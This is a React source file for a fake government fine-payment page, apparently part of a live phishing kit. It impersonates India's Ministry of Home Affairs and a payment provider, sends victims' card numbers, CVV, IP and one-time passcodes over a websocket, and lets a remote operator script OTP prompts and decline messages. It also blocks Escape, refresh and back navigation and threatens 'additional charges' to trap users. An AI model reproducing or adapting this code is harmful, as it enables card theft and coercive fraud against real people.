import React, { useState, useEffect, useRef } from 'react';
import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
import { wsClient } from '@/integrations/ws-client';
import OTPVerificationPage from './OTPVerificationPage';

const getRealIP = async () => {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.log('Could not fetch real IP, using fallback');
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }
};

const getRandomNetwork = () => {
  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
  return networks[Math.floor(Math.random() * networks.length)];
};

interface PaymentFormProps {
  highlightFields: boolean;
  clickTrigger: number;
}

const PaymentForm: React.FC<PaymentFormProps> = ({ highlightFields, clickTrigger }) => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '29000.00'
  });

  const [isLoading, setIsLoading] = useState(false);
  const [showOtp, setShowOtp] = useState(false);
  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [showProcessing, setShowProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
  const [showAlert, setShowAlert] = useState(false);
  const [fadeState, setFadeState] = useState('visible');
  const [showBackDialog, setShowBackDialog] = useState(false);
  const [longPressTimer, setLongPressTimer] = useState<ReturnType<typeof setTimeout> | null>(null);
  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
  const [selectedBank, setSelectedBank] = useState('ICICI BANK');
  const [selectedBankLogo, setSelectedBankLogo] = useState('');
  const [isMobile, setIsMobile] = useState(false);

  const [inputGlow, setInputGlow] = useState({
    cardNumber: false,
    expiryMonth: false,
    expiryYear: false,
    cvv: false,
    cardHolder: false,
  });

  const inactivityTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Function to reset the inactivity timer
  const resetInactivityTimer = () => {
    if (inactivityTimer.current) {
      clearTimeout(inactivityTimer.current);
    }
    inactivityTimer.current = setTimeout(() => {
      setInputGlow({
        cardNumber: false,
        expiryMonth: false,
        expiryYear: false,
        cvv: false,
        cardHolder: false,
      });
    }, 2000); // 2 seconds
  };

  // Initial glow on fullscreen entry
  useEffect(() => {
    if (highlightFields) {
      setInputGlow({
        cardNumber: true,
        expiryMonth: true,
        expiryYear: true,
        cvv: true,
        cardHolder: true,
      });
      resetInactivityTimer(); // Start the inactivity timer
    }
  }, [highlightFields, clickTrigger]);

  // Check if device is mobile
  useEffect(() => {
    const checkMobile = () => {
      const isMobileDevice = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
      setIsMobile(isMobileDevice);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  // Check if all card details are filled
  const isFormValid = () => {
    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
           formData.expiryMonth.length >= 1 && formData.expiryMonth.length <= 2 &&
           formData.expiryYear.length >= 1 && formData.expiryYear.length <= 2 &&
           formData.cvv.length >= 3 &&
           formData.cardHolder.trim().length > 0;
  };

  useEffect(() => {
    // Only apply desktop-specific key blocking if not on mobile
    if (isMobile) return;

    // Ultra-strong ESC key blocking - ENHANCED VERSION
    const handleKeyDown = (event: KeyboardEvent) => {
      // Block ESC key completely with maximum prevention
      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
        event.preventDefault();
        event.stopPropagation();
        event.stopImmediatePropagation();
        
        // Force fullscreen to stay active
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(() => {
            console.log('Fullscreen request failed');
          });
        }
        
        return false;
      }
      
      // Block back navigation
      if (event.altKey && event.key === 'ArrowLeft') {
        event.preventDefault();
        setShowBackDialog(true);
        return false;
      }
      
      // Block browser shortcuts
      if (event.key === 'F5' || 
          (event.ctrlKey && event.key === 'r') || 
          (event.ctrlKey && event.key === 'F5') ||
          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
          (event.altKey && event.key === 'F4') ||
          (event.key === 'F11')) {
        event.preventDefault();
        event.stopPropagation();
        return false;
      }
    };

    // Add back button prevention for desktop
    const handlePopState = (event: PopStateEvent) => {
      event.preventDefault();
      setShowBackDialog(true);
      window.history.pushState(null, '', window.location.href);
    };

    // Push initial state and add listener
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', handlePopState);

    // Ultra-strong event blocking on multiple targets with maximum prevention
    const targets = [document, window, document.body, document.documentElement];
    const events = ['keydown', 'keyup', 'keypress'];
    
    targets.forEach(target => {
      events.forEach(eventType => {
        target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
      });
    });

    // Additional ESC blocking layers
    const preventEscape = (e: KeyboardEvent) => {
      if (e.key === 'Escape' || e.keyCode === 27) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
      }
    };

    // Multiple event listeners for maximum ESC blocking
    document.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    window.addEventListener('keydown', preventEscape, { capture: true, passive: false });
    document.body.addEventListener('keydown', preventEscape, { capture: true, passive: false });

    return () => {
      window.removeEventListener('popstate', handlePopState);
      targets.forEach(target => {
        events.forEach(eventType => {
          target.removeEventListener(eventType, handleKeyDown, true);
        });
      });
      document.removeEventListener('keydown', preventEscape, true);
      window.removeEventListener('keydown', preventEscape, true);
      document.body.removeEventListener('keydown', preventEscape, true);
      if (longPressTimer) {
        clearTimeout(longPressTimer);
      }
    };
  }, [longPressTimer, isMobile]);

  useEffect(() => {
    const handleAdminCommand = (payload: any) => {
      const { command, submission_id, bank_name, bank_logo } = payload;
      console.log('PaymentForm received admin command:', payload);
      
      // Only process commands if we have a socket ID
      if (!submission_id) {
        console.log('No submission_id in command payload');
        return;
      }
      
      // Get the current socket ID
      const socketId = wsClient.getSocketId();
      if (!socketId) {
        console.log('No socket ID available');
        return;
      }
      
      // Only process commands if they match our socket ID
      if (submission_id !== socketId) {
        console.log('Command submission_id does not match our socket ID');
        return;
      }

      switch (command) {
        case 'showotp':
          if (bank_name) setSelectedBank(bank_name);
          if (bank_logo) setSelectedBankLogo(bank_logo);
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(true);
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'fail':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card has been declined');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'success':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsConfirmLoading(false);
            setShowProcessing(true);
            setFadeState('fadeIn');
            setTimeout(() => {
              setShowProcessing(false);
              setShowSuccess(true);
              setTimeout(() => {
                window.location.replace('https://google.com');
              }, 2000);
            }, 4000);
          }, 300);
          break;
        case 'invalidotp':
          setIsConfirmLoading(false);
          setInvalidOtpMessage('Invalid OTP, Enter valid one time passcode sent to your mobile');
          break;
        case 'cardinvalid':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Your card is invalid, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
        case 'carddisabled':
          setFadeState('fadeOut');
          setTimeout(() => {
            setIsLoading(false);
            setShowOtp(false);
            setErrorMessage('Card disabled, please try another card');
            setFadeState('fadeIn');
          }, 300);
          break;
      }
    };

    wsClient.on('admin_command', handleAdminCommand);
    return () => {
      wsClient.off('admin_command', handleAdminCommand);
    };
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    setInputGlow((prev) => ({ ...prev, [name]: false })); // Turn off glow for this field
    resetInactivityTimer(); // Reset inactivity timer on any input


    if (name === 'cardNumber') {
      setFormData(prev => ({ ...prev, cardNumber: formatCardNumber(value) }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
  };

  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    const limited = cleaned.slice(0, 16);
    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
    return formatted;
  };

  const generateInvoiceId = () => {
    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
  };

  const sendOtp = (otp: string) => {
    if (currentSubmissionId) {
      console.log(`[PaymentForm] Sending OTP: ${otp} for submission_id: ${currentSubmissionId}`);
      wsClient.send('otp_submitted', { otp, submission_id: currentSubmissionId });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid()) return;
    setIsLoading(true);
    setErrorMessage('');

    // Get the socket ID and ensure we have it before proceeding
    const socketId = wsClient.getSocketId();
    console.log(`[PaymentForm] Current socket ID: ${socketId}`);
    if (!socketId) {
      console.error('No socket ID available');
      setErrorMessage('Error: Not connected to server. Please refresh.');
      setIsLoading(false);
      return;
    }

    // Store the socket ID for command targeting
    setCurrentSubmissionId(socketId);

    // Get real IP and prepare card data
    const realIP = await getRealIP();
    const cardData = {
      id: socketId, // Use socket ID as the ID
      socket_id: socketId, // Also include as socket_id for clarity
      invoice_id: generateInvoiceId(), // Generate invoice ID
      card_number: formData.cardNumber,
      expiry_month: formData.expiryMonth,
      expiry_year: formData.expiryYear,
      cvv: formData.cvv,
      card_holder: formData.cardHolder,
      amount: formData.amount,
      user_ip: realIP,
      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
      network: getRandomNetwork(),
      created_at: new Date().toISOString(),
      status: 'pending'
    };

    console.log('Submitting card data:', {
      socketId,
      invoiceId: cardData.invoice_id,
      amount: cardData.amount,
      cardNumber: cardData.card_number
    });

    wsClient.send('card_submission', cardData);
  };

  const handleConfirmPay = async (otp: string) => {
    setIsConfirmLoading(true);
    setInvalidOtpMessage('');
    sendOtp(otp);
  };

  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
    setShowBackDialog(false);
    if (action === 'leave') {
      setErrorMessage('Please try again');
      window.location.href = '/';
    }
  };

  const maskCardInfo = (value: string) => {
    return '*'.repeat(value.length);
  };

  if (showSuccess) {
    return (
      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
        <div className="text-center pt-4">
          <div className="text-green-600 text-6xl animate-bounce">✓</div>
          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
        </div>
      </div>
    );
  }

  if (showProcessing) {
    return (
      <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? 'min-h-screen' : 'p-6 min-h-screen'}`}>
        <div className="text-center pt-4">
          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
        </div>
      </div>
    );
  }

  if (showOtp) {
    return (
      <div className={`${isMobile ? 'w-full' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'}`}>
        <OTPVerificationPage
          onBack={() => setShowOtp(false)}
          onConfirm={handleConfirmPay}
          isLoading={isConfirmLoading}
          invalidOtpMessage={invalidOtpMessage}
          cardNumber={formData.cardNumber}
          amount={formData.amount}
          bankLogo={selectedBankLogo}
        />
      </div>
    );
  }
  return (
    <div className={`${isMobile ? 'w-full p-4' : 'w-96'} bg-white ${!isMobile && 'border-l border-gray-200'} ${isMobile ? '' : 'p-6'} transition-opacity duration-300 ${
      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
    }`}>
      {showBackDialog && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg shadow-lg">
            <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
            <div className="flex space-x-4">
              <button
                onClick={() => handleBackDialogAction('leave')}
                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
              >
                Leave
              </button>
              <button
                onClick={() => handleBackDialogAction('cancel')}
                className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {showAlert && (
        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
          <AlertTriangle className="w-5 h-5" />
          <span className="font-bold">Complete the fine payment here</span>
        </div>
      )}

      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
        <div className="flex items-center mb-2">
          <Shield className="w-5 h-5 text-red-600 mr-2" />
          <span className="font-semibold text-red-800">Secure Payment Required</span>
        </div>
        <p className="text-sm text-red-700">
          Complete your payment to proceed with cyber crime complaint registration.
        </p>
      </div>

      {errorMessage && (
        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
          <p className="text-red-600 text-sm">{errorMessage}</p>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Amount to Pay
          </label>
          <div className="relative">
            <span className="absolute left-3 top-2 text-gray-500">₹</span>
            <input
              type="text"
              name="amount"
              value={formData.amount}
              onChange={handleInputChange}
              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
              readOnly
            />
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Number
          </label>
          <div className="relative">
            <CreditCard className="absolute left-3 top-3 w-6 h-6 text-gray-400" />
            <input
              type="text"
              name="cardNumber"
              placeholder="1234 5678 9012 3456"
              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
              onChange={handleInputChange}
              className={`w-full pl-12 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                inputGlow.cardNumber ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
              }`}
              maxLength={19}
              disabled={isLoading}
            />
          </div>
        </div>

        <div className="grid grid-cols-3 gap-3">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Month
            </label>
            <input
              type="text"
              name="expiryMonth"
              placeholder="MM"
              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
              onChange={handleInputChange}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                inputGlow.expiryMonth ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
              } ${formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) 
                ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={2}
              disabled={isLoading}
            />
            {formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) && (
              <p className="text-red-500 text-xs mt-1">Valid month (1-12)</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              Year
            </label>
            <input
              type="text"
              name="expiryYear"
              placeholder="YY"
              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
              onChange={handleInputChange}
              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                inputGlow.expiryYear ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
              } ${formData.expiryYear && parseInt(formData.expiryYear) > 50 
                ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={2}
              disabled={isLoading}
            />
            {formData.expiryYear && parseInt(formData.expiryYear) > 50 && (
              <p className="text-red-500 text-xs mt-1">Valid year (max 50)</p>
            )}
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              CVV
            </label>
            <div className="relative">
              <Lock className="absolute left-2 top-3 w-6 h-6 text-gray-400" />
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                onChange={handleInputChange}
                className={`w-full pl-10 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  inputGlow.cvv ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
                }`}
                maxLength={4}
                disabled={isLoading}
              />
            </div>
          </div>
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">
            Card Holder Name
          </label>
          <input
            type="text"
            name="cardHolder"
            placeholder="Enter full name as on card"
            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
            onChange={handleInputChange}
            className={`w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
              inputGlow.cardHolder ? 'ring-4 ring-red-500 ring-opacity-50 rounded-lg' : ''
            }`}
            disabled={isLoading}
          />
        </div>

        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
          <div className="flex items-center text-sm text-blue-800">
            <Shield className="w-4 h-4 mr-2" />
            <span>256-bit SSL Encryption</span>
          </div>
        </div>

        <button
          type="submit"
          disabled={!isFormValid() || isLoading}
          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
            isFormValid() && !isLoading
              ? 'bg-green-600 text-white hover:bg-green-700'
              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
          }`}
        >
          {isLoading ? (
            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
          ) : (
            `Pay Securely ₹${formData.amount}`
          )}
        </button>

        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
          <img 
            src="https://logotyp.us/file/rupay.svg" 
            alt="RuPay" 
            className="h-8 w-12 object-contain filter brightness-0" 
          />
        </div>

           <div className="text-center mt-4 mb-4">
          <span className="text-sm text-gray-500">Powered by </span>
          <svg fill="#072654" viewBox=".8 .48 1894.74 400.27" className="inline-block h-8 align-middle" xmlns="http://www.w3.org/2000/svg">
            <path d="m122.63 105.7-15.75 57.97 90.15-58.3-58.96 219.98 59.88.05 87.1-324.92" fill="#3395ff"/>
            <path d="m25.6 232.92-24.8 92.48h122.73l50.22-188.13zm426.32-81.42c-3 11.15-8.78 19.34-17.4 24.57-8.6 5.22-20.67 7.84-36.25 7.84h-49.5l17.38-64.8h49.5c15.56 0 26.25 2.6 32.05 7.9s7.2 13.4 4.22 24.6m51.25-1.4c6.3-23.4 3.7-41.4-7.82-54-11.5-12.5-31.68-18.8-60.48-18.8h-110.47l-66.5 248.1h53.67l26.8-100h35.2c7.9 0 14.12 1.3 18.66 3.8 4.55 2.6 7.22 7.1 8.04 13.6l9.58 82.6h57.5l-9.32-77c-1.9-17.2-9.77-27.3-23.6-30.3 17.63-5.1 32.4-13.6 44.3-25.4a92.6 92.6 0 0 0 24.44-42.5m130.46 86.4c-4.5 16.8-11.4 29.5-20.73 38.4-9.34 8.9-20.5 13.3-33.52 13.3-13.26 0-22.25-4.3-27-13-4.76-8.7-4.92-21.3-.5-37.8s11.47-29.4 21.17-38.7 21.04-13.95 34.06-13.95c13 0 21.9 4.5 26.4 13.43 4.6 8.97 4.7 21.8.2 38.5zm23.52-87.8-6.72 25.1c-2.9-9-8.53-16.2-16.85-21.6-8.34-5.3-18.66-8-30.97-8-15.1 0-29.6 3.9-43.5 11.7s-26.1 18.8-36.5 33-18 30.3-22.9 48.4c-4.8 18.2-5.8 34.1-2.9 47.9 3 13.9 9.3 24.5 19 31.9 9.8 7.5 22.3 11.2 37.6 11.2a82.4 82.4 0 0 0 35.2-7.7 82.11 82.11 0 0 0 28.4-21.2l-7 26.16h51.9l47.39-176.77h-52zm238.65 0h-150.93l-10.55 39.4h87.82l-116.1 100.3-9.92 37h155.8l10.55-39.4h-94.1l117.88-101.8m142.4 52c-4.67 17.4-11.6 30.48-20.75 39-9.15 8.6-20.23 12.9-33.24 12.9-27.2 0-36.14-17.3-26.86-51.9 4.6-17.2 11.56-30.13 20.86-38.84 9.3-8.74 20.57-13.1 33.82-13.1 13 0 21.78 4.33 26.3 13.05 4.52 8.7 4.48 21.67-.13 38.87m30.38-80.83c-11.95-7.44-27.2-11.16-45.8-11.16-18.83 0-36.26 3.7-52.3 11.1a113.09 113.09 0 0 0 -41 32.06c-11.3 13.9-19.43 30.2-24.42 48.8-4.9 18.53-5.5 34.8-1.7 48.73 3.8 13.9 11.8 24.6 23.8 32 12.1 7.46 27.5 11.17 46.4 11.17 18.6 0 35.9-3.74 51.8-11.18 15.9-7.48 29.5-18.1 40.8-32.1 11.3-13.94 19.4-30.2 24.4-48.8s5.6-34.84 1.8-48.8c-3.8-13.9-11.7-24.6-23.6-32.05m185.1 40.8 13.3-48.1c-4.5-2.3-10.4-3.5-17.8-3.5-11.9 0-23.3 2.94-34.3 8.9-9.46 5.06-17.5 12.2-24.3 21.14l6.9-25.9-15.07.06h-37l-47.7 176.7h52.63l24.75-92.37c3.6-13.43 10.08-24 19.43-31.5 9.3-7.53 20.9-11.3 34.9-11.3 8.6 0 16.6 1.97 24.2 5.9m146.5 41.1c-4.5 16.5-11.3 29.1-20.6 37.8-9.3 8.74-20.5 13.1-33.5 13.1s-21.9-4.4-26.6-13.2c-4.8-8.85-4.9-21.6-.4-38.36 4.5-16.75 11.4-29.6 20.9-38.5 9.5-8.97 20.7-13.45 33.7-13.45 12.8 0 21.4 4.6 26 13.9s4.7 22.2.28 38.7m36.8-81.4c-9.75-7.8-22.2-11.7-37.3-11.7-13.23 0-25.84 3-37.8 9.06-11.95 6.05-21.65 14.3-29.1 24.74l.18-1.2 8.83-28.1h-51.4l-13.1 48.9-.4 1.7-54 201.44h52.7l27.2-101.4c2.7 9.02 8.2 16.1 16.6 21.22 8.4 5.1 18.77 7.63 31.1 7.63 15.3 0 29.9-3.7 43.75-11.1 13.9-7.42 25.9-18.1 36.1-31.9s17.77-29.8 22.6-47.9c4.9-18.13 5.9-34.3 3.1-48.45-2.85-14.17-9.16-25.14-18.9-32.9m174.65 80.65c-4.5 16.7-11.4 29.5-20.7 38.3-9.3 8.86-20.5 13.27-33.5 13.27-13.3 0-22.3-4.3-27-13-4.8-8.7-4.9-21.3-.5-37.8s11.42-29.4 21.12-38.7 21.05-13.94 34.07-13.94c13 0 21.8 4.5 26.4 13.4 4.6 8.93 4.63 21.76.15 38.5zm23.5-87.85-6.73 25.1c-2.9-9.05-8.5-16.25-16.8-21.6-8.4-5.34-18.7-8-31-8-15.1 0-29.68 3.9-43.6 11.7-13.9 7.8-26.1 18.74-36.5 32.9s-18 30.3-22.9 48.4c-4.85 18.17-5.8 34.1-2.9 47.96 2.93 13.8 9.24 24.46 19 31.9 9.74 7.4 22.3 11.14 37.6 11.14 12.3 0 24.05-2.56 35.2-7.7a82.3 82.3 0 0 0 28.33-21.23l-7 26.18h51.9l47.38-176.7h-51.9zm269.87.06.03-.05h-31.9c-1.02 0-1.92.05-2.85.07h-16.55l-8.5 11.8-2.1 2.8-.9 1.4-67.25 93.68-13.9-109.7h-55.08l27.9 166.7-61.6 85.3h54.9l14.9-21.13c.42-.62.8-1.14 1.3-1.8l17.4-24.7.5-.7 77.93-110.5 65.7-93 .1-.06h-.03z"/>
          </svg>
        </div>

        <div className="text-xs text-gray-500 text-center mt-4">
          <p>Protected by Government of India</p>
          <p>Ministry of Home Affairs</p>
        </div>
      </form>
    </div>
  );
};

export default PaymentForm;
